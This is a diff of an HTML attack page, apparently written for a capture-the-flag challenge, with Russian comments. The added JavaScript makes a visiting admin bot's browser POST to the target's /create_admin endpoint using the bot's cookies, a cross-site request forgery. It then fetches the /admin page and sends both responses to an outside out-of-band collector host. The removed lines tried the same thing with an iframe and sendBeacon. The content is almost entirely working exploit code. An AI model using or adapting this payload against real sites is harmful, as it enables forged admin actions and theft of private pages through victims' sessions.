@@ -1,44 +1,50 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="resultFrame" name="resultFrame" style="display:none"></iframe>
-
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Сначала загружаем iframe с целевым сайтом
-const iframe = document.getElementById('resultFrame');
-iframe.src = TARGET + '/admin';
+// Когда БОТ загрузит эту страницу, он выполнит код со СВОИМИ куками
 
-// 2. Через 2 секунды отправляем форму в этот iframe
-setTimeout(() => {
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = TARGET + '/create_admin';
-    form.target = 'resultFrame';
-    form.innerHTML = '<input name="new_admin_login" value="DELAYED_FORM">';
-    document.body.appendChild(form);
-    form.submit();
+// 1. Создаём админа используя куки бота
+fetch(TARGET + '/create_admin', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    credentials: 'include', // Ключево! Куки бота отправятся
+    body: 'new_admin_login=BOT_CREATED_' + Date.now()
+})
+.then(response => response.text())
+.then(data => {
+    // 2. Результат отправляем на наш сервер
+    fetch(COLLAB + '/result', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data.substring(0, 2000)
+    });
     
-    // 3. Через ещё 3 секунды пытаемся прочитать iframe
-    setTimeout(() => {
-        try {
-            // Пробуем разные методы чтения
-            const result = iframe.contentWindow.name || 
-                          iframe.contentDocument.title || 
-                          iframe.contentDocument.body.textContent;
-            
-            if (result) {
-                navigator.sendBeacon(COLLAB + '/final_result', String(result).substring(0, 1000));
-            } else {
-                navigator.sendBeacon(COLLAB + '/no_result', 'empty');
-            }
-        } catch(e) {
-            navigator.sendBeacon(COLLAB + '/cors_error', e.message);
-        }
-    }, 3000);
-}, 2000);
+    // 3. Также пробуем получить админскую страницу
+    return fetch(TARGET + '/admin', {
+        credentials: 'include'
+    });
+})
+.then(response => response.text())
+.then(adminPage => {
+    // 4. Отправляем админку
+    fetch(COLLAB + '/admin_page', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: adminPage.substring(0, 3000)
+    });
+})
+.catch(error => {
+    // 5. Отправляем ошибку
+    fetch(COLLAB + '/error', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: error.toString()
+    });
+});
 </script>
 </body>
 </html>
